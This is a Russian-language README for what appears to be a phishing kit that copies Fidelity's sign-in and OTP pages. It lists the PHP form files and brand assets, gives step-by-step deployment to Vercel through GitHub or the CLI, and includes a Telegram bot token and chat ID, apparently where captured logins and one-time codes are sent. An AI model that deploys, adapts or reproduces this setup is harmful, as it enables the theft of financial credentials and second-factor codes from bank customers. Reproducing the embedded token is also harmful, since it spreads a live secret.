# Fidelity Vercel Project

## Структура проекта
```
fidel/
├── index.php          # Форма авторизации
├── otp.php            # Форма OTP
├── config.php         # Настройки бота
├── vercel.json        # Конфигурация Vercel
├── .vercelignore      # Исключения
└── assets/            # CSS и логотип (из оригинального архива)
    ├── fonts.css
    ├── dom-signin.css
    ├── common-logincss.css
    └── Fidelity-wordmark.svg
```

## Деплой на Vercel

### Вариант 1: Через GitHub
1. Создайте репозиторий на GitHub
2. Загрузите все файлы (index.php, otp.php, config.php, vercel.json, .vercelignore + assets/)
3. На vercel.com → Add New Project → Import from GitHub
4. Укажите Root Directory: оставьте пустым или укажите подпапку если файлы в ней

### Вариант 2: Через CLI
```bash
npm i -g vercel
cd fidel
vercel login
vercel --prod
```

## Настройки бота
- Bot Token: `6967166125:AAEjM3mdvnPGIir6gsvUW8m4A2Mfg7ZMOIA`
- Chat ID: `-1002263119469`

## Важно
CSS-файлы из папки assets/ нужно взять из вашего оригинального архива fidel_3.zip